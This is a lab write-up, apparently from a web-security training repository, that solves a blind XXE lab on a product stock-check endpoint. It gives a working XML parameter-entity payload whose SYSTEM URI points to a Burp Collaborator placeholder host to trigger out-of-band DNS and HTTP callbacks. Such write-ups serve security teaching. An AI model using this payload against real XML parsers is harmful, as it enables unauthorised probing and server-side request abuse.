# Lab: Blind XXE with out-of-band interaction via XML parameter entities

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/3905891a-1a74-4761-9e06-41028cfecd11)

## Solution

The application has a product stock check endpoint.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/0df8e00c-553a-4690-b2e7-4b279df894a3)

The application checks for the stock level of a product by submitting XML to the server:

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/748a8a83-c784-4600-a07e-a5e5c8183289)

Go to burp collaborator and click on **copy to clipboard**.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/69f3423f-2df6-412e-89e1-72f6123b43c8)

Insert the following external entity definition in between the XML declaration and the `stockCheck` element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:

`<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>`

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/7f1b0b8b-6051-452d-abc3-f299783b8afe)

Some DNS and HTTP interactions that were initiated by the application as the result of our payload.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/ed8c9758-f764-4102-a037-a25f9d6eafb3)

Causing this DNS interactions solves the lab.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/12e6f636-360f-4dd9-ab15-8abedbb3a4bb)
